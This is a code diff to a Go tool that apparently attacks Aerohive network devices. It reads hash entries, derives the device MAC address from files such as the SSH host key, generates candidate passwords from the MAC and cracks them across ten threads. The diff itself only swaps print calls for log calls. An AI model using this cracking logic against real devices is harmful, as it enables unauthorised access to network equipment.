@@ -148,7 +148,7 @@ func noAccess(port int) {
 		if strings.Contains(v, "Aerohive") {
 			parts := strings.Split(v, ":")
 			if len(parts) > 2 {
-				fmt.Println("Hash: ", v)
+				log.Println("Hash: ", v)
 				hashes = append(hashes, hash{User: parts[0], Hash: []byte(parts[1])})
 			} else {
 				log.Println("Skipping entry: ", v, " as it hasnt split right")
@@ -165,7 +165,7 @@ func noAccess(port int) {
 		"/f/etc/ssh_host_rsa_key.pub",
 	}
 
-	fmt.Println("Attempting to find mac address")
+	log.Println("Attempting to find mac address")
 
 	var mac string
 Out:
@@ -205,15 +205,15 @@ Out:
 
 	//Fix their terrible mac format
 
-	fmt.Println("Got mac address ending with: ", mac[len(mac)-8:])
-	fmt.Printf("Generating passwords...")
+	log.Println("Got mac address ending with: ", mac[len(mac)-8:])
+	log.Printf("Generating passwords...")
 	passwords, err := generatePasswords(mac)
 	check(err)
-	fmt.Printf("Done\n")
+	log.Printf("Done\n")
 
 	//As this has at max 1 million guesess there really isnt much reason to have a stop feature
 	var wg sync.WaitGroup
-	fmt.Printf("Started cracking threads: ")
+	log.Printf("Started cracking threads")
 	for i := 0; i < 10; i++ { // Make 10 threads and split up the password list between them
 		list := make([]string, len(passwords)/10)
 		for ii := i; ii < len(passwords); ii += 10 {
@@ -244,10 +244,8 @@ Out:
 			}
 
 		}(list)
-
-		fmt.Printf("%d ", i)
 	}
-	fmt.Printf("\nCracking...\n")
+	log.Printf("Cracking...\n")
 
 	wg.Wait()
 	log.Println("Finished")
